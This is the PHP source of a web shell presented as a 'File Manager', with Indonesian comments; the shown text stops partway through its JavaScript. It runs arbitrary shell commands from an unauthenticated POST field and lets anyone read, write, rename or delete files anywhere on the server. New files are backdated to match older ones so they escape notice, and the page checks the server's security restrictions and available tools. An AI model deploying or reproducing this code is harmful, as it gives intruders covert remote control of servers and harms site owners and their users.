<?php
ini_set('log_errors', 1);
ini_set('display_errors', 0);

function setCookieDir($dir) {
    setcookie('current_dir', $dir, time() + 7200, '/'); // Set cookie for 1 hour
}

function getCookieDir() {
    return isset($_COOKIE['current_dir']) ? $_COOKIE['current_dir'] : getcwd();
}

function path() {
    $dir = isset($_GET['dir']) ? $_GET['dir'] : getCookieDir();
    $dir = str_replace("\\", "/", $dir);
    @chdir($dir);
    setCookieDir($dir);
    return $dir;
}
// function read file
function fgc($file){
	return file_get_contents($file);
}

function parentDir($currentDir) {
    return dirname($currentDir);
}

function OS() {
    return (substr(strtoupper(PHP_OS), 0, 3) === "WIN") ? "Windows" : "Linux";
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
    switch ($_POST['action']) {
        case 'create_folder':
            handleCreateFolder();
            break;
        case 'create_file':
            handleCreateFile();
            break;
        case 'delete':
            handleDelete();
            break;
        case 'rename':
            handleRename();
            break;
        case 'update':
            handleUpdateFile();
            break;
        case 'upload':
            handleFileUpload();
            break;
    }
    exit();
} elseif ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['action']) && $_GET['action'] === 'view' && isset($_GET['file'])) {
    $file = $_GET['file'];
    $content = readFileContents($file);

    if ($content !== false) {
        echo "<p>File Contents: " . htmlspecialchars($file) . "</p>";
        echo '<pre style="color: white;">' . htmlspecialchars($content) . '</pre>';
    } else {
        echo "<p>Unable to read file.</p>";
    }
    exit();
}


function handleCreateFolder() {
    $dir = isset($_POST['dir']) ? $_POST['dir'] : path();
    $folderName = filter_input(INPUT_POST, 'folder_name', FILTER_SANITIZE_STRING);
    
    if ($folderName) {
        $fullPath = rtrim($dir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $folderName;
        if (is_dir($fullPath)) {
            echo json_encode(['status' => 'error', 'message' => 'Folder already exists.']);
        } else {
            if (mkdir($fullPath, 0755, true)) {
                echo json_encode(['status' => 'success', 'message' => 'Folder created successfully.']);
            } else {
                echo json_encode(['status' => 'error', 'message' => 'Unable to create folder.']);
            }
        }
    } else {
        echo json_encode(['status' => 'error', 'message' => 'Folder name is required.']);
    }
}

function handleCreateFile() {
    $dir = isset($_POST['dir']) ? $_POST['dir'] : path();
    $fileName = filter_input(INPUT_POST, 'file_name', FILTER_SANITIZE_STRING);
    $fileContent = filter_input(INPUT_POST, 'file_content', FILTER_SANITIZE_STRING);
    
    if ($fileName) {
        $fullPath = rtrim($dir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $fileName;
        if (is_file($fullPath)) {
            echo json_encode(['status' => 'error', 'message' => 'File already exists.']);
        } else {
            if (file_put_contents($fullPath, $fileContent) !== false) {
                $oldestDate = getOldestDate($dir);
                if ($oldestDate) {
                    if (touch($fullPath, strtotime($oldestDate))) {
                        echo json_encode(['status' => 'success', 'message' => 'File created and timestamp updated successfully.']);
                    } else {
                        echo json_encode(['status' => 'success', 'message' => 'File created successfully, but unable to update timestamp.']);
                    }
                } else {
                    echo json_encode(['status' => 'success', 'message' => 'File created successfully, but no date found for updating timestamp.']);
                }
            } else {
                echo json_encode(['status' => 'error', 'message' => 'Unable to create file.']);
            }
        }
    } else {
        echo json_encode(['status' => 'error', 'message' => 'File name is required.']);
    }
}

function handleDelete() {
    if (!isset($_POST['path'])) {
        echo json_encode(['status' => 'error', 'message' => 'Path not specified.']);
        exit();
    }

    $path = $_POST['path'];

    if (is_file($path)) {
        if (unlink($path)) {
            echo json_encode(['status' => 'success', 'message' => 'File deleted successfully.']);
        } else {
            echo json_encode(['status' => 'error', 'message' => 'Unable to delete file.']);
        }
    } elseif (is_dir($path)) {
        if (deleteDirectory($path)) {
            echo json_encode(['status' => 'success', 'message' => 'Directory deleted successfully.']);
        } else {
            echo json_encode(['status' => 'error', 'message' => 'Unable to delete directory.']);
        }
    } else {
        echo json_encode(['status' => 'error', 'message' => 'Path does not exist.']);
    }
    exit();
}

function deleteDirectory($dir) {
    if (!is_dir($dir)) {
        return false;
    }

    $items = array_diff(scandir($dir), array('.', '..'));
    foreach ($items as $item) {
        $path = $dir . DIRECTORY_SEPARATOR . $item;
        if (is_dir($path)) {
            deleteDirectory($path);
        } else {
            unlink($path);
        }
    }
    rmdir($dir);
    return true;
}

function handleRename() {
    if (!isset($_POST['path'], $_POST['new_name'])) return;

    $path = $_POST['path'];
    $new_name = $_POST['new_name'];

    rename($path, dirname($path) . DIRECTORY_SEPARATOR . $new_name);

    echo json_encode(['status' => 'success', 'message' => 'Item renamed successfully.']);
    exit();
}

function handleUpdateFile() {
    if (isset($_POST['file_path']) && isset($_POST['file_content'])) {
        $file_path = $_POST['file_path'];
        $file_content = $_POST['file_content'];
        
        if (is_file($file_path) && is_writable($file_path)) {
            file_put_contents($file_path, $file_content);
            echo json_encode(['status' => 'success', 'message' => 'File updated successfully.']);
        } else {
            echo json_encode(['status' => 'error', 'message' => 'Unable to update file.']);
        }
    } else {
        echo json_encode(['status' => 'error', 'message' => 'File path or content missing.']);
    }
    exit();
}

function handleFileUpload() {
    $dir = isset($_POST['dir']) ? $_POST['dir'] : path();
    $file = isset($_FILES['file']) ? $_FILES['file'] : null;
    print_r($dir);
    
    // if ($file && $file['error'] === UPLOAD_ERR_OK) {
    //     $tmpName = $file['tmp_name'];
    //     $fileName = basename($file['name']);
    //     $fullPath = rtrim($dir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $fileName;
        
    //     error_log("Temporary file location: " . $tmpName);
    //     error_log("Target file path: " . $fullPath);
        
    //     if (move_uploaded_file($tmpName, $fullPath)) {
    //         $oldestDate = getOldestDate($dir);
    //         if ($oldestDate) {
    //             if (touch($fullPath, strtotime($oldestDate))) {
    //                 echo json_encode(['status' => 'success', 'message' => 'File uploaded and timestamp updated successfully.']);
    //             } else {
    //                 echo json_encode(['status' => 'success', 'message' => 'File uploaded successfully, but unable to update timestamp.']);
    //             }
    //         } else {
    //             echo json_encode(['status' => 'success', 'message' => 'File uploaded successfully, but no date found for updating timestamp.']);
    //         }
    //     } else {
    //         error_log("Error moving uploaded file. Check directory permissions and path.");
    //         echo json_encode(['status' => 'error', 'message' => 'Unable to move uploaded file.']);
    //     }
    // } else {
    //     echo json_encode(['status' => 'error', 'message' => 'No file uploaded or upload error.']);
    // }
}


function readFileContents($file_path) {
    return is_file($file_path) && is_readable($file_path) ? fgc($file_path) : false;
}

function getOldestDate($directory) {
    $files = scandir($directory);
    $oldestDate = null;

    foreach ($files as $file) {
        if ($file != '.' && $file != '..') {
            $filePath = $directory . DIRECTORY_SEPARATOR . $file;
            $filemtime = filemtime($filePath);
            
            if (!$oldestDate || $filemtime < $oldestDate) {
                $oldestDate = $filemtime;
            }
        }
    }
    
    return $oldestDate ? date('Y-m-d', $oldestDate) : null;
}

$dir = path();
$items = scandir($dir);
$directories = [];
$files = [];

// Add parent directory if it's not the root directory
if ($dir !== '/') {
    $parentPath = parentDir($dir);
    $directories[] = [
        'name' => '..',
        'path' => $parentPath,
        'type' => 'dir',
        'owner' => '',
        'group' => '',
        'perms' => perms($parentPath),
        'modification_date' => date("Y-m-d H:i:s", filemtime($parentPath)),
        'link' => "<a href='#' class='dir-link' data-dir='" . $parentPath . "'>..</a>"
    ];
}

// Organize items into directories and files
foreach ($items as $item) {
    if ($item == "." || $item == "..") continue;

    $itemPath = $dir . DIRECTORY_SEPARATOR . $item;
    $info = [
        'name' => $item,
        'path' => $itemPath,
        'owner' => fileowner($itemPath),
        'group' => filegroup($itemPath),
        'perms' => perms($itemPath),
        'modification_date' => date("Y-m-d H:i:s", filemtime($itemPath)),
        'link' => is_dir($itemPath) ? "<a href='#' class='dir-link' data-dir='" . $itemPath . "'>$item</a>" : "<a href='#' class='file-link' data-file='" . urlencode($itemPath) . "'>$item</a>"
    ];

    if (is_dir($itemPath)) {
        $directories[] = array_merge($info, ['type' => 'dir']);
    } elseif (is_file($itemPath)) {
        $files[] = array_merge($info, ['type' => 'file']);
    }
}


if (isset($_POST['cmd'])) {
    $command = $_POST['cmd'];
    if ($command === 'cls' || $command === 'clear') {
        echo '__CLEAR__';
    } else {
        $output = exe($command);
        echo nl2br(htmlspecialchars($output));
    }
    exit;
}

function exe($cmd) {
    if (function_exists('system')) {
        @ob_start();
        @system($cmd);
        $buff = @ob_get_contents();
        @ob_end_clean();
        return $buff;
    } elseif (function_exists('exec')) {
        @exec($cmd, $results);
        $buff = "";
        foreach ($results as $result) {
            $buff .= $result . "\n";
        }
        return $buff;
    } elseif (function_exists('passthru')) {
        @ob_start();
        @passthru($cmd);
        $buff = @ob_get_contents();
        @ob_end_clean();
        return $buff;
    } elseif (function_exists('shell_exec')) {
        $buff = @shell_exec($cmd);
        return $buff;
    }
    return "Command execution not supported.";
}

function perms($c) {
    $x = fileperms($c);
    if (($x & 0xC000) == 0xC000) { $u = 's'; }
    elseif (($x & 0xA000) == 0xA000) { $u = 'l'; }
    elseif (($x & 0x8000) == 0x8000) { $u = '-'; }
    elseif (($x & 0x6000) == 0x6000) { $u = 'b'; }
    elseif (($x & 0x4000) == 0x4000) { $u = 'd'; }
    elseif (($x & 0x2000) == 0x2000) { $u = 'c'; }
    elseif (($x & 0x1000) == 0x1000) { $u = 'p'; }
    else { $u = 'u'; }

    $u .= (($x & 0x0100) ? 'r' : '-');
    $u .= (($x & 0x0080) ? 'w' : '-');
    $u .= (($x & 0x0040) ? (($x & 0x0200) ? 's' : 'x') : (($x & 0x0200) ? 'S' : '-'));

    $u .= (($x & 0x0020) ? 'r' : '-');
    $u .= (($x & 0x0010) ? 'w' : '-');
    $u .= (($x & 0x0008) ? (($x & 0x0400) ? 's' : 'x') : (($x & 0x0400) ? 'S' : '-'));

    $u .= (($x & 0x0004) ? 'r' : '-');
    $u .= (($x & 0x0002) ? 'w' : '-');
    $u .= (($x & 0x0001) ? (($x & 0x0200) ? 't' : 'x') : (($x & 0x0200) ? 'T' : '-'));

    return $u;
}

function hdd($s) {
    if ($s >= 1073741824) {
        return sprintf('%1.2f GB', $s / 1073741824);
    } elseif ($s >= 1048576) {
        return sprintf('%1.2f MB', $s / 1048576);
    } elseif ($s >= 1024) {
        return sprintf('%1.2f KB', $s / 1024);
    } else {
        return $s . ' B';
    }
}

function hdd_numeric($s) {
    return $s;
}

$freespace_numeric = hdd_numeric(disk_free_space("/"));
$total_numeric = hdd_numeric(disk_total_space("/"));
$used_numeric = $total_numeric - $freespace_numeric;

$freespace = hdd($freespace_numeric);
$total = hdd($total_numeric);
$used = hdd($used_numeric);


$freespace_numeric = hdd_numeric(disk_free_space("/"));
$total_numeric = hdd_numeric(disk_total_space("/"));
$used_numeric = $total_numeric - $freespace_numeric;

$freespace = hdd($freespace_numeric);
$total = hdd($total_numeric);
$used = hdd($used_numeric);

$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? "ON" : "OFF";
$ds = @ini_get("disable_functions");
$open_basedir = @ini_get("Open_Basedir");
$safemode_exec_dir = @ini_get("safe_mode_exec_dir");
$safemode_include_dir = @ini_get("safe_mode_include_dir");
$show_ds = (!empty($ds)) ? "$ds" : "All Functions Is Accessible";
$mysql = (function_exists('mysql_connect')) ? "ON" : "OFF";
$curl = (function_exists('curl_version')) ? "ON" : "OFF";
$wget = (exe('wget --help')) ? "ON" : "OFF";
$perl = (exe('perl --help')) ? "ON" : "OFF";
$ruby = (exe('ruby --help')) ? "ON" : "OFF";
$mssql = (function_exists('mssql_connect')) ? "ON" : "OFF";
$pgsql = (function_exists('pg_connect')) ? "ON" : "OFF";
$python = (exe('python --help')) ? "ON" : "OFF";
$magicquotes = (function_exists('get_magic_quotes_gpc')) ? "ON" : "OFF";
$ssh2 = (function_exists('ssh2_connect')) ? "ON" : "OFF";
$oracle = (function_exists('oci_connect')) ? "ON" : "OFF";

$show_obdir = (!empty($open_basedir)) ? "OFF" : "ON";
$show_exec = (!empty($safemode_exec_dir)) ? "OFF" : "ON";
$show_include = (!empty($safemode_include_dir)) ? "OFF" : "ON";


?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Manager</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Bitter:ital,wght@0,100..900;1,100..900&display=swap');

        body {
            background: linear-gradient(135deg, #0d0d0d, #1a1a1a);
            color: #fff;
            font-family: 'Bitter', serif;
            justify-content: center;
            align-items: center;
            height: auto;
            padding: 15px;
            margin: 0;
            font-size: 12px;
        }
        .status-on {
            color: green;
        }

        .status-off {
            color: red;
        }

        .status-accessible {
            color: green;
        }

        .status-disabled {
            color: red;
        }
        .usage {
            color: red; /* Ganti dengan warna yang diinginkan untuk Usage */
        }

        .free-space {
            color: green; /* Ganti dengan warna yang diinginkan untuk Free Space */
        }

        .total {
            color: #fff; /* Ganti dengan warna yang diinginkan untuk Total */
        }

        ::-webkit-scrollbar {
            width: 8px;
        }

        ::-webkit-scrollbar-thumb {
            background-color: #0ff; /* Scrollbar color */
            border-radius: 5px;
        }

        ::-webkit-scrollbar::horizontal {
            background-color: #0ff; /* Scrollbar color */
            border-radius: 5px;
        }

        .container {
            max-width: 90%; /* Increased width */
            background: rgba(20, 20, 20, 0.9);
            border-radius: 15px;
            box-shadow: 0 4px 15px rgba(0, 255, 255, 0.5);
            padding: 20px; /* Reduced padding */
            border: 1px solid #0ff;
        }

        a {
            color: #0ff;
            text-decoration: none !important;
        }

        a:hover {
            color: #00e5e5; 
            text-decoration: none !important;
            cursor: pointer;  
        }
        .pre {
            color:#fff;
        }
        .btn {
            color: #fff;
            font-size: 12px;
            background-color: transparent;
            border: 1px dashed #0ff;
        }

        .btn:hover {
            color: #0ff;
        }

        .header {
            text-align: center;
            margin-bottom: 10px; /* Reduced margin */
        }

        .nav-pills .nav-link {
            border-radius: 10px;
            margin: 0 5px;
            color: #0ff;
            background: rgba(255, 255, 255, 0.1);
            border: 1px solid transparent;
            transition: background 0.3s, color 0.3s, border 0.3s;
            font-size: 12px;
        }

        .nav-pills .nav-link.active {
            color: #0d0d0d;
            background: #0ff;
            border-color: #0ff;
        }

        .nav-pills .nav-link:hover {
            color: #0d0d0d;
            background: rgba(0, 255, 255, 0.2);
            border-color: #0ff;
        }

        .tab-content {
            background: rgba(20, 20, 20, 0.9);
            border-radius: 10px;
            box-shadow: 0 4px 15px rgba(0, 255, 255, 0.5);
            padding: 20px; /* Reduced padding */
            border: 1px dashed #0ff;
        }

        .tab-pane {
            min-height: 300px;
        }

        .info-section {
            margin-top: 20px; /* Reduced margin */
            padding: 20px; /* Reduced padding */
            background: rgba(20, 20, 20, 0.9);
            border-radius: 10px;
            box-shadow: 0 4px 15px rgba(0, 255, 255, 0.5);
            border: 1px dashed #0ff;
            color: #0ff;
            display: flex;
            justify-content: space-between; /* Distribute space between the two parts */
        }

        .info-part {
            flex: 1; /* Make each part take equal space */
            padding: 0 10px; /* Padding between the two parts */
        }

        .info-part.left {
            border-right: 1px dashed #0ff; /* Dashed border between parts */
        }

        .info-section .info-item {
            margin-bottom: 10px; /* Reduced margin */
            text-align: left;
            font-size: 12px;
            color: #fff;
        }

        .info-section .info-item:last-child {
            margin-bottom: 0;
        }

        @media (max-width: 768px) {
            .info-section {
                flex-direction: column; /* Stack parts vertically on small screens */
            }

            .info-part {
                border-right: none; /* Remove the right border */
                border-bottom: 1px dashed #0ff; /* Add bottom border for visual separation */
                padding: 10px 0; /* Adjust padding for vertical stack */
            }
        }


        .table {
            background: rgba(20, 20, 20, 0.9);
            color: #0ff;
            border-collapse: separate;
            border-spacing: 0;
        }

        .table th, .table td {
            border: 1px solid #0ff; /* Set border color */
            padding: 10px; /* Adjust padding if needed */
        }

        .table thead {
            background: rgba(0, 255, 255, 0.2); /* Lighter background for header */
        }

        .table thead th {
            color: #0d0d0d; /* Darker color for header text */
            font-weight: bold;
        }

        .table tbody tr:nth-child(even) {
            background: rgba(0, 255, 255, 0.05); /* Slightly different background for even rows */
        }

        .table tbody tr:nth-child(odd) {
            background: rgba(20, 20, 20, 0.9); /* Darker background for odd rows */
        }

        .table tbody td {
            color: #0ff; /* Set text color for table body */
        }

        .modal-content {
            background: #0d0d0d;
            color: #fff;
            border: 1px solid #0ff;
            border-radius: 10px;
        }

        .modal-header, .modal-footer {
            border-bottom: none;
            border-top: none;
        }

        .modal-header {
            background: rgba(0, 255, 255, 0.1);
        }

        .modal-footer {
            background: rgba(255, 255, 255, 0.1);
        }

        .modal-body {
            background: rgba(0, 0, 0, 0.7);
        }

        .modal-title {
            color: #0ff;
        }

        .terminal {
            background-color: black;
            color: #0ff; /* Bright green text color */
            font-family: 'Courier New', Courier, monospace;
            font-size: 14px;
            line-height: 1.5;
            padding: 20px;
            margin: 0 auto;
            height: 600px;
            word-wrap: break-word;
            border: 1px solid #0ff; /* Optional border for better definition */
            border-radius: 5px; /* Optional rounded corners */
            border: 1px dashed #0ff;
        }

        .terminal-content {
            height: 100%;
            overflow-y: auto;
        }

        .terminal-form {
            display: flex;
            flex-direction: column;
        }

        .terminal-content::-webkit-scrollbar {
            width: 8px;
        }

        .terminal-content::-webkit-scrollbar-thumb {
            background-color: #0ff; /* Scrollbar color */
            border-radius: 5px;
        }

        .terminal-prompt {
            color: #0ff; /* Prompt text color */
            margin-right: 10px; /* Space between prompt and input field */
            white-space: nowrap; /* Prevents prompt from wrapping */
        }

        .terminal-input {
            border: none;
            background: transparent;
            color: #c5c5c5; /* Light gray text for input */
            font-family: 'Courier New', Courier, monospace;
            font-size: 14px;
            outline: none;
            flex: 1; /* Allows input to take remaining space */
            padding: 0;
            margin: 0;
            box-sizing: border-box; /* Includes padding in width calculation */
            width: 50%;
        }

        .terminal-input::placeholder {
            color: #666; /* Placeholder text color */
        }
    </style>
</head>
<body>
<div class="container">
    <h1 class="header">File Manager</h1>
    <ul class="nav nav-pills mb-3" id="pills-tab" role="tablist">
        <li class="nav-item" role="presentation">
            <button class="nav-link active" id="explorer-tab" data-toggle="pill" data-target="#explorer" type="button" role="tab" aria-controls="explorer" aria-selected="true">Home</button>
        </li>
        <li class="nav-item" role="presentation">
            <button class="nav-link" id="cmd-tab" data-toggle="pill" data-target="#cmd" type="button" role="tab" aria-controls="cmd" aria-selected="false">CMD</button>
        </li>
        <li class="nav-item" role="presentation">
            <button class="nav-link" id="pills-contact-tab" data-toggle="pill" data-target="#pills-contact" type="button" role="tab" aria-controls="pills-contact" aria-selected="false">Tools</button>
        </li>
    </ul>
    
    <div class="info-section mb-4">
    <div class="info-part left">
        <div class="info-item">
            Usage: <span class="usage"><?php echo $used; ?></span><br>
            Free Space: <span class="free-space"><?php echo $freespace; ?></span><br>
            Total: <span class="total"><?php echo $total; ?></span>
        </div>
        <div class="info-item">
            Current Directory: <span class="current-directory"><?php print ($_SERVER['DOCUMENT_ROOT']); ?></span>
        </div>
    </div>
    <div class="info-part right">
        <div class="info-item">
            Kernel Version : <?php echo php_uname() ?> <br/>
            Safe Mode : <span class="<?php echo $sm === 'ON' ? 'status-on' : 'status-off'; ?>"><?php echo $sm; ?></span> <br/>
            Disable Functions : <span class="<?php echo $show_ds === 'All Functions Is Accessible' ? 'status-accessible' : 'status-disabled'; ?>"><?php echo $show_ds; ?></span> <br/>
            Open_Basedir : <span class="<?php echo $show_obdir === 'ON' ? 'status-on' : 'status-off'; ?>"><?php echo $show_obdir; ?> </span>|
            Safe Mode Exec Dir : <span class="<?php echo $show_exec === 'ON' ? 'status-on' : 'status-off'; ?>"><?php echo $show_exec; ?> </span>|
            Safe Mode Include Dir : <span class="<?php echo $show_include === 'ON' ? 'status-on' : 'status-off'; ?>"><?php echo $show_include; ?></span> <br/>
            MySQL : <span class="<?php echo $mysql === 'ON' ? 'status-on' : 'status-off'; ?>"><?php echo $mysql; ?> </span>|
            PostgreSQL : <span class="<?php echo $pgsql === 'ON' ? 'status-on' : 'status-off'; ?>"><?php echo $pgsql; ?> </span>|
            Perl : <span class="<?php echo $perl === 'ON' ? 'status-on' : 'status-off'; ?>"><?php echo $perl; ?> </span>|
            Python : <span class="<?php echo $python === 'ON' ? 'status-on' : 'status-off'; ?>"><?php echo $python; ?> </span>|
            Ruby : <span class="<?php echo $ruby === 'ON' ? 'status-on' : 'status-off'; ?>"><?php echo $ruby; ?> </span>|
            WGET : <span class="<?php echo $wget === 'ON' ? 'status-on' : 'status-off'; ?>"><?php echo $wget; ?> </span>|
            cURL : <span class="<?php echo $curl === 'ON' ? 'status-on' : 'status-off'; ?>"><?php echo $curl; ?> </span>|
            Magic Quotes : <span class="<?php echo $magicquotes === 'ON' ? 'status-on' : 'status-off'; ?>"><?php echo $magicquotes; ?> </span>|
            SSH2 : <span class="<?php echo $ssh2 === 'ON' ? 'status-on' : 'status-off'; ?>"><?php echo $ssh2; ?> </span>|
            Oracle : <span class="<?php echo $oracle === 'ON' ? 'status-on' : 'status-off'; ?>"><?php echo $oracle; ?></span>
        </div>
    </div>
</div>


    <div class="mb-3">
    <a href="javascript:void(0);" onclick="show('xnewfolder')" style="color:#fff;">
        <span style="color: #198754;">[</span> New Folder <span style="color: #198754;">]</span>
    </a>
    <a href="javascript:void(0);" onclick="show('xnewfile')" style="color:#fff;">
        <span style="color: #198754;">[</span> New File <span style="color: #198754;">]</span>
    </a>
    <a href="javascript:void(0);" onclick="show('xnewupload')" style="color:#fff;">
        <span style="color: #198754;">[</span> Upload <span style="color: #198754;">]</span>
    </a>
    <div id="xnewfolder" class="mb-3">
        <form id="create-folder-form">
            <table style="width: 560px;">
                <tbody>
                    <tr>
                        <input type="hidden" name="action" value="create_folder">
                        <input type="hidden" name="dir" value="">
                        <td style="width:130px;">New Folder</td>
                        <td><input type="text" id="folder-name" name="folder_name" required  style="width:300px; font-size:12px;"></td>
                        <td><button type="submit" class="btn">Create Folder</button></td>
                    </tr>
                </tbody>
            </table>
        </form>
    </div>
    <div id="xnewfile" class="mb-3">
        <form id="create-file-form">
            <input type="hidden" name="action" value="create_file">
            <input type="hidden" name="dir" value="">
            <table style="width: 560px;">
                <tbody>
                    <tr>
                        <td style="width:130px;">New File</td>
                        <td><input type="text" id="file-name" name="file_name" style="width: 300px;" required></td>
                        <input type="hidden" id="file-content" name="file_content" class="form-control" value="Hello World"></input>
                        <td><button type="submit" class="btn">Create File</button></td>
                    </tr>
                </tbody>
            </table>
            
        </form>
    </div>
    <div id="xnewupload" class="form-container mb-3">
        <form id="upload-form" method="POST" enctype="multipart/form-data">
            <input type="hidden" name="action" value="upload">
            <input type="hidden" id="upload-dir" name="dir" value="">
            <table style="width: 560px;">
                <tbody>
                    <tr>
                        <td style="width:130px;">Upload File</td>
                        <td><input type="file" id="file-upload" name="file" required></td>
                        <td><button type="submit" class="btn">Upload File</button></td>
                    </tr>
                </tbody>
            </table>
        </form>
    </div>

    <div class="content">
        <div class="tab-content" id="pills-tabContent">
            <div class="tab-pane fade show active" id="explorer" role="tabpanel" aria-labelledby="explorer-tab">
                <table class="table table-striped" id="file-manager-table">
                    <thead>
                        <tr>
                            <th style="color:#0ff; font-size:12px;">Name</th>
                            <th style="color:#0ff">Type</th>
                            <th style="color:#0ff">Permissions</th>
                            <th style="color:#0ff">Owner</th>
                            <th style="color:#0ff">Group</th>
                            <th style="color:#0ff">Last Modified</th>
                            <th style="color:#0ff">Actions</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php foreach (array_merge($directories, $files) as $item): ?>
                            <tr>
                                <td style="font-size: 12px;"><?php echo $item['link']; ?></td>
                                <td style="font-size: 12px;"><?php echo $item['type']; ?></td>
                                <td style="font-size: 12px;"><?php echo $item['perms']; ?></td>
                                <td style="font-size: 12px;"><?php echo $item['owner']; ?></td>
                                <td style="font-size: 12px;"><?php echo $item['modification_date']; ?></td>
                                <td style="font-size: 12px;"><?php echo $item['group']; ?></td>
                                <td>
                                    <?php if ($item['type'] === 'file'): ?>
                                        <button class="btn file-link" data-file="<?php echo urlencode($item['path']); ?>">View</button>
                                        <button class="btn edit-file" data-file="<?php echo htmlspecialchars($item['path']); ?>">Edit</button>
                                    <?php endif; ?>
                                    <?php if ($item['name'] !== '.' && $item['name'] !== '..'): ?>
                                        <button class="btn rename-button" data-path="<?php echo htmlspecialchars($item['path']); ?>">Rename</button>
                                        <button class="btn delete-btn" data-path="<?php echo htmlspecialchars($item['path']); ?>">Delete</button>
                                    <?php endif; ?>
                                </td>
                            </tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>
            </div>
            <div class="tab-pane fade" id="cmd" role="tabpanel" aria-labelledby="cmd-tab">
                <div id="terminal" class="terminal">
                    <div id="terminal-output" class="terminal-content"></div>
                    <form id="terminal-form" autocomplete="off" class="terminal-form">
                        <div class="terminal-prompt-container">
                            <span class="terminal-prompt">user@php-file-manager:~$</span>
                            <input type="text" class="terminal-input" autofocus placeholder="Type your command here..." />
                        </div>
                    </form>
                </div>
            </div>
            <div class="tab-pane fade" id="pills-contact" role="tabpanel" aria-labelledby="pills-contact-tab">TOOLS</div>
        </div>
    </div>

<!-- START MODAL HERE -->
    <div class="modal fade" id="viewItemModal" tabindex="-1" role="dialog">
        <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
            <div class="modal-content">
                <div class="modal-header">
                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                        <span aria-hidden="true">&times;</span>
                    </button>
                </div>
                <div class="modal-body">
                    <p id="itemContent"></p>
                </div>
            </div>
        </div>
    </div>
    <!-- Modal for Rename Item -->
    <div class="modal fade" id="renameItemModal" tabindex="-1" role="dialog" aria-labelledby="renameItemModalLabel" aria-hidden="true">
        <div class="modal-dialog" role="document">
            <div class="modal-content">
                <div class="modal-header">
                <h5 class="modal-title" style="font-size: 12px;">Rename</h5>
                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                        <span aria-hidden="true">&times;</span>
                    </button>
                </div>
                <div class="modal-body">
                    <form id="renameItem">
                        <input type="hidden" id="renameItemPath" name="path">
                        <div class="form-group">
                            <label style="font-size: 12px;" for="renameItemName">New Name</label>
                            <input style="font-size: 12px;" type="text" class="form-control" id="renameItemName" name="new_name" required>
                        </div>
                        <button type="submit" class="btn btn-primary">Save changes</button>
                    </form>
                </div>
            </div>
        </div>
    </div>

<!-- END MODAL HERE -->
    <div id="file-manager-content"></div>
    
</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/zepto/1.2.0/zepto.min.js"></script>
<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.3/dist/umd/popper.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>

<script>
Zepto(document).ready(function() {
    function show(boxid) {
        var box = document.getElementById(boxid);
        if (box) {
            var elements = ['xnewfile', 'xnewfolder', 'xnewupload'];
            for (var i = 0; i < elements.length; i++) {
                var el = document.getElementById(elements[i]);
                if (el) {
                    el.style.display = 'none'; // Menyembunyikan semua form
                }
            }
            if (box.style.display === 'none' || box.style.display === '') {
                box.style.display = 'block'; // Menampilkan form yang dipilih
                box.focus();
                localStorage.setItem('visibleBox', boxid); // Simpan keadaan di local storage
            } else {
                box.style.display = 'none'; // Menyembunyikan form jika sudah ditampilkan
                localStorage.removeItem('visibleBox'); // Hapus keadaan dari local storage
            }
        } else {
            console.error('Element with ID ' + boxid + ' not found.');
        }
    }

    // Semua form sudah tersembunyi secara default pada HTML
    // Cek apakah ada keadaan yang disimpan di local storage
    var visibleBox = localStorage.getItem('visibleBox');
    if (visibleBox) {
        show(visibleBox); // Tampilkan form yang sesuai dari local storage
    }

    Zepto(document).on('click', '.file-link', function(e) {
        e.preventDefault();
        viewItem(decodeURIComponent(Zepto(this).data('file')));
    });

    Zepto(document).on('click', '.rename-button', function() {
        var path = Zepto(this).data('path');
        var name = Zepto(this).closest('tr').find('td:first').text(); // Ambil nama dari tabel
        console.log(name);
        Zepto('#renameItemPath').val(path);
        Zepto('#renameItemName').val(name);
        Zepto('#renameItemModal').modal('show');
    });

    function viewItem(path) {
        Zepto.ajax({
            url: '',
            type: 'GET',
            data: { action: 'view', file: path },
            success: function(data) {
                Zepto('#itemContent').html(data);
                Zepto('#viewItemModal').modal('show');
            },
            error: function(xhr, status, error) {
                console.error('Error loading file content:', error);
            }
        });
    }

    Zepto('#renameItem').submit(function(e) {
        e.preventDefault();
        Zepto.ajax({
            url: '',
            type: 'POST',
            data: Zepto(this).serialize() + '&action=rename',
            dataType: 'json',
            success: function(response) {
                alert(response.message);
                refreshTable(getCookie('current_dir'));
            },
            error: function(xhr, status, error) {
                console.error('Error updating item:', error);
            }
        });
    });

    Zepto('#terminal-form').submit(function(e) {
        e.preventDefault();
        var command = Zepto('.terminal-input').val();
        Zepto.ajax({
            url: '',
            type: 'POST',
            data: { cmd: command },
            dataType: 'html',
            success: function(response) {
                if (response === '__CLEAR__') {
                    Zepto('#terminal-output').html('');
                } else {
                    Zepto('#terminal-output').append('<div>' + response + '</div>');
                }
                Zepto('.terminal-input').val('').focus();
                Zepto('#terminal-output').scrollTop(Zepto('#terminal-output')[0].scrollHeight);
            },
            error: function(xhr, status, error) {
                console.error('Error executing command:', error);
            }
        });
    });

    function refreshTable(dir) {
        Zepto.get('', { dir: dir }, function(data) {
            var newHtml = Zepto(data).find('#file-manager-table tbody').html();
            Zepto('#file-manager-table tbody').html(newHtml);
            Zepto('#current-dir').text(dir);
        }).fail(function() {
            console.error('Failed to load directory contents.');
        });
    }

    function updateURL(dir) {
        // Update the URL without changing the path
        history.replaceState({ dir: dir }, '', window.location.pathname);
